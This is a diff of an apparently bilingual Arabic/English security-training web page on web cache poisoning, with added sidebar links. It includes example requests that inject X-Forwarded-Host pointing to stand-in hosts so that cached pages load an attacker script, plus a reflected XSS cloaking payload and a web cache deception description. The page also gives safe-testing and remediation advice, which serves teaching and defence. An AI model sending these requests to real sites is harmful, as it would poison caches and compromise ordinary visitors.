@@ -58,6 +58,10 @@
     <a class="sidebar-link" href="vulnerabilities/ai-llm-security.html">🤖 AI/LLM Security</a>
     <a class="sidebar-link" href="vulnerabilities/cloud-security.html">☁️ Cloud Security</a>
     <a class="sidebar-link" href="vulnerabilities/active-directory.html">🏰 Active Directory</a>
+    <a class="sidebar-link" href="vulnerabilities/xss.html">🕷️ Cross-Site Scripting (XSS)</a>
+    <a class="sidebar-link" href="vulnerabilities/csrf.html">🎭 CSRF</a>
+    <a class="sidebar-link" href="vulnerabilities/lfi-rfi.html">📂 LFI & RFI</a>
+    <a class="sidebar-link" href="vulnerabilities/xxe.html">📜 XXE</a>
     
     <div class="sidebar-title" style="margin-top:18px;">Labs / المختبرات</div>
     <a class="sidebar-link" href="index.html">🐚 Linux Terminal</a>
@@ -81,99 +85,124 @@
     <a class="sidebar-link" href="linux-security/linux-checklist.html">📋 Audit Checklist</a>
     <a class="sidebar-link" href="linux-security/linux-analysis.html">🛡️ Linux Analysis</a>
 
+    
+    <div class="sidebar-title" style="margin-top:18px;">Writeups / التقارير</div>
+    <a class="sidebar-link" href="writeups/api-hacking.html">📝 API Hacking</a>
+    <a class="sidebar-link" href="writeups/graphql-attack.html">📝 GraphQL Leak</a>
+    <a class="sidebar-link" href="writeups/cloud-ssrf.html">📝 Cloud SSRF</a>
+    <a class="sidebar-link" href="writeups/linux-suid-root.html">📝 Linux SUID</a>
+    <a class="sidebar-link" href="writeups/recon-mastery.html">📝 Recon Mastery</a>
+    <a class="sidebar-link" href="writeups/ai-prompt-inj.html">📝 AI Prompt Inj</a>
+    <a class="sidebar-link" href="writeups/race-payments.html">📝 Race Conditions</a>
+    <a class="sidebar-link" href="writeups/ad-to-domain.html">📝 AD Domain</a>
+    <a class="sidebar-link" href="writeups/nuclei-to-p1.html">📝 Nuclei to P1</a>
+    <a class="sidebar-link" href="writeups/jwt-advanced.html">📝 JWT Advanced</a>
+
     <div class="sidebar-title" style="margin-top:18px;">Profile / ملفي</div>
     <a class="sidebar-link" href="profile.html">👤 Profile / الملف الشخصي</a>
   </aside>
 
   <main class="academy-main">
-    
 <div class="page-hero">
-  <h1 class="page-title">تسميم الذاكرة المخبئية — تسميم الجماهير</h1>
-  <p class="page-title-en">Web Cache Poisoning — Poisoning the Masses</p>
-  <span class="severity-pill pill-high">HIGH</span>
-  <span class="severity-pill pill-medium">OWASP A06</span>
+  <h1 class="page-title">تسميم الذاكرة المؤقتة (Web Cache Poisoning) — الدليل الشامل</h1>
+  <p class="page-title-en">Web Cache Poisoning — The Ultimate Deep Dive</p>
+  <span class="severity-pill pill-critical">CRITICAL / HIGH</span>
+  <span class="severity-pill pill-medium">Advanced Web Attacks</span>
 </div>
 
 <div class="bilingual-block">
   <div class="lang-section">
     <span class="lang-tag">AR</span>
-    <p><strong>Web Cache Poisoning</strong> هي ثغرة متقدمة تحدث عندما يستطيع المهاجم التلاعب برؤوس الطلبات غير المحددة في مفتاح الذاكرة المخبئية (Unkeyed Headers) مثل <code>X-Forwarded-Host</code>، لجعل الخادم يولد استجابة ضارة ويقوم وسيط الـ Cache (مثل Cloudflare أو Akamai) بحفظها وتوزيعها لجميع الزوار اللاحقين.</p>
+    <p><strong>تسميم الذاكرة المؤقتة للويب (Web Cache Poisoning)</strong> هي تقنية متقدمة تحدث عندما يتلاعب المهاجم برد الخادم (Response) ويجعله خبيثاً، ثم يتم حفظ هذا الرد الخبيث في الذاكرة المؤقتة (Cache) ليتم تقديمه لكل المستخدمين الشرعيين الآخرين. خطورة هذه الثغرة تكمن في أنها تحول ثغرة غير ضارة (مثل Reflected XSS لا يمكن استغلالها إلا بنقرة مستخدم) إلى ثغرة <strong>Stored XSS</strong> تصيب كل من يزور الصفحة بدون أي تدخل!</p>
   </div>
   <div class="lang-section lang-en">
     <span class="lang-tag">EN</span>
-    <p><strong>Web Cache Poisoning</strong> is an advanced vulnerability where an attacker manipulates unkeyed request headers (like <code>X-Forwarded-Host</code>) to force the server into caching a malicious response, which is then served by the CDNs (like Cloudflare or Akamai) to all subsequent users.</p>
+    <p><strong>Web Cache Poisoning</strong> occurs when an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. By sending a request with hidden headers or unkeyed parameters, the attacker forces the server to generate a malicious payload, which the cache then saves and serves to victims.</p>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>أنواع تسميم الكاش / Attack Types</h2>
+  <h2>مفاهيم أساسية (Cache Keys & Unkeyed Inputs)</h2>
+  <p>لفهم الثغرة، يجب فهم كيف تعمل الذاكرة المؤقتة (Varnish, Cloudflare, Fastly, etc):</p>
+  <ul>
+    <li><strong>Cache Key (مفتاح الكاش):</strong> هو الجزء من الطلب الذي يستخدمه الكاش لتمييز الطلبات عن بعضها. عادةً ما يكون <code>Host</code> + <code>URL Path</code> + <code>Query String</code>.</li>
+    <li><strong>Unkeyed Input (المدخلات غير المفتاحية):</strong> هي الأجزاء من الطلب التي يتجاهلها الكاش عند حفظ الرد (مثل <code>X-Forwarded-Host</code>، <code>User-Agent</code> أحياناً، والـ Headers غير القياسية).</li>
+  </ul>
+  <p><strong>الفكرة:</strong> إذا أرسلت <code>Unkeyed Input</code> خبيث أدى لتغيير في صفحة الويب (الرد)، سيقوم الكاش بحفظ هذا الرد تحت الـ <code>Cache Key</code> العادي، وسيحصل الجميع على الرد المسموم!</p>
+</div>
+
+<div class="section-card">
+  <h2>آلية الاستغلال والهجمات (Attack Vectors)</h2>
+  
   <div class="type-grid">
     <div class="type-item">
-      <h4>Basic Cache Poisoning</h4>
-      <p>التلاعب بالرؤوس (Headers) لحقن جافا سكريبت في الـ Cached page.</p>
+      <h4>1. Unkeyed Header Injection (X-Forwarded-Host)</h4>
+      <p class="lang-ar">أكثر الأنواع شيوعاً. التطبيق يستخدم <code>X-Forwarded-Host</code> لتوليد روابط لملفات الـ JS:</p>
+      <div class="cmd-block" style="margin-top: 10px;">
+        <pre>GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: evil.com</pre>
+      </div>
+      <p class="lang-ar">استجابة الخادم وتسميم الكاش:</p>
+      <div class="cmd-block" style="margin-top: 10px;">
+        <pre>HTTP/1.1 200 OK
+Cache-Control: public, max-age=1800
+
+&lt;script src="https://evil.com/setup.js"&gt;&lt;/script&gt;</pre>
+      </div>
+      <p class="lang-ar">الآن كل زائر لـ <code>/en?region=uk</code> سيتم تحميل سكربت <code>evil.com</code> لديه.</p>
     </div>
+    
     <div class="type-item">
-      <h4>DOM-based Cache Poisoning</h4>
-      <p>التلاعب بالـ Unkeyed headers لتغيير المتغيرات التي تقرأها جافا سكريبت بالـ DOM.</p>
+      <h4>2. Parameter Cloaking (إخفاء المعاملات)</h4>
+      <p class="lang-ar">إذا كان الكاش يستبعد باراميتر معين من הـ Cache Key (مثلاً الـ UTM parameters للتتبع):</p>
+      <div class="cmd-block" style="margin-top: 10px;">
+        <pre>GET /page?utm_content=x&xss=">&lt;script>alert(1)&lt;/script> HTTP/1.1</pre>
+      </div>
+      <p class="lang-ar">أو التلاعب بمعالجة الـ Query string (مثلاً الخادم يعتبر <code>?a=1;b=2</code> معاملين، بينما الكاش يعتبره معاملاً واحداً).</p>
     </div>
+
     <div class="type-item">
-      <h4>Cache Deception</h4>
-      <p>خداع الـ Cache لحفظ ملفات المستخدمين الحساسة (مثل `/profile`) على أنها ملفات ثابتة (مثل `/profile.js`) لتسهيل قراءتها علناً.</p>
+      <h4>3. Cache Deception (Web Cache Deception)</h4>
+      <p class="lang-ar">تختلف عن التسميم! هنا المهاجم يخدع الضحية لزيارة مسار مثل <code>/my-profile/index.css</code>. الكاش يرى <code>.css</code> فيحفظ الصفحة (وهي في الحقيقة ملف شخصي يحتوي بيانات حساسة للضحية). المهاجم يزور نفس الرابط لاحقاً ويقرأ بيانات الضحية من الكاش (يُشار إليها بـ WCD).</p>
     </div>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>أوامر واختبار الثغرة / Testing & HTTP Headers</h2>
-  <p>يتم اختبار الثغرة بإرسال ترويسات مخصصة غير مفهرسة (Unkeyed) ومراقبة ما إذا كانت تنعكس في الاستجابة ويتم إرسال ترويسة <code>X-Cache: HIT</code>:</p>
-  <div class="cmd-block">
-    <pre># طلب يحتوي على ترويسة خبيثة
-GET /index.html HTTP/1.1
-Host: target.com
-X-Forwarded-Host: attacker.com
-
-# الاستجابة المخزنة التي تحتوي على كود خبيث
-HTTP/1.1 200 OK
-X-Cache: MISS
-...
-&lt;script src="https://attacker.com/tracking.js"&gt;&lt;/script&gt;
-
-# عند إعادة إرسال الطلب بدون الترويسة الخبيثة، تعود نفس الاستجابة المخزنة
-GET /index.html HTTP/1.1
-Host: target.com
-
-HTTP/1.1 200 OK
-X-Cache: HIT
-...
-&lt;script src="https://attacker.com/tracking.js"&gt;&lt;/script&gt;</pre>
-    <div class="cmd-footer"><button class="copy-btn" onclick="copyCmd(this)">📋 Copy</button></div>
-  </div>
-</div>
-
-<div class="section-card">
-  <h2>الأدوات / Tools</h2>
+  <h2>أدوات الأتمتة (Automation Tools)</h2>
   <div class="tools-row">
-    <span class="tool-chip">Param Miner (Burp Suite Extension)</span>
-    <span class="tool-chip">toxicache</span>
-    <span class="tool-chip">Burp Suite Repeater</span>
+    <span class="tool-chip">Param Miner (Burp Ext)</span>
+    <span class="tool-chip">Cache Poisoning Scanner</span>
+    <span class="tool-chip">TruffleHog (for Cache)</span>
   </div>
+  <p style="margin-top: 15px;">إضافة <strong>Param Miner</strong> (برمجة James Kettle) هي الأداة القياسية الذهبية لاكتشاف الـ Unkeyed Headers بشكل خفي (Background) أثناء تصفحك للموقع عبر Burp Suite.</p>
 </div>
 
 <div class="section-card">
-  <h2>Writeup</h2>
-  <div class="bilingual-block">
-    <div class="lang-section">
-      <span class="lang-tag">AR</span>
-      <p>Writeup: <strong>Web Cache Poisoning: Poisoning the Masses</strong> — كيف استطاع الباحث جيمس كيتل حقن كود XSS في الصفحة الرئيسية لشركة كبرى وسرقة كوكيز آلاف المستخدمين دفعة واحدة عبر الكاش.</p>
-    </div>
-    <div class="lang-section lang-en">
-      <span class="lang-tag">EN</span>
-      <p>Writeup: <strong>Web Cache Poisoning: Poisoning the Masses</strong> — James Kettle's legendary research on mass user compromise using unkeyed header injections.</p>
-    </div>
-  </div>
+  <h2>منع إيذاء المستخدمين أثناء الاختبار (Safe Testing)</h2>
+  <p style="color: red; font-weight: bold;">تنبيه: اختبار تسميم الكاش يمكن أن يكسر الموقع للزوار الحقيقيين (Denial of Service) أو يخترقهم!</p>
+  <ul>
+    <li>دائماً أضف باراميتر خاص بك (Cache Buster) كجزء من הـ Cache Key عند الاختبار: <code>GET /?test=12345abdo</code>.</li>
+    <li>بهذه الطريقة، إذا سممت الكاش، سيتسمم فقط لـ <code>/?test=12345abdo</code> ولن يتأثر زوار الصفحة الرئيسية <code>/</code>.</li>
+  </ul>
 </div>
 
-  </main>
+<div class="section-card">
+  <h2>كيفية الحماية (Remediation)</h2>
+  <ul>
+    <li>تجنب استخدام بيانات من <code>HTTP Headers</code> لبناء ردود (Responses) أو روابط (URLs) بأي شكل من الأشكال (خاصة <code>X-Forwarded-*</code> و <code>Host</code>).</li>
+    <li>إذا كنت مضطراً لاستخدامها، قم بإضافتها إلى قائمة הـ <strong>Vary Header</strong> لضمان تخزين الكاش بشكل منفصل بناءً عليها (تصبح Keyed).</li>
+    <li>تعطيل التخزين المؤقت (Caching) للصفحات التي تعكس مدخلات المستخدمين.</li>
+  </ul>
+</div>
+
+<div class="section-card">
+  <h2>التطبيق العملي / Writeup & Lab</h2>
+  <a class="cta-lab" href="labs/web-cache-poisoning-lab.html">🧪 افتح مختبر Web Cache Poisoning التفاعلي — 3 مستويات</a>
+</div>
+
+</main>
 </div>
 
 <!-- Dynamic Relative Path & Active Class Resolver -->
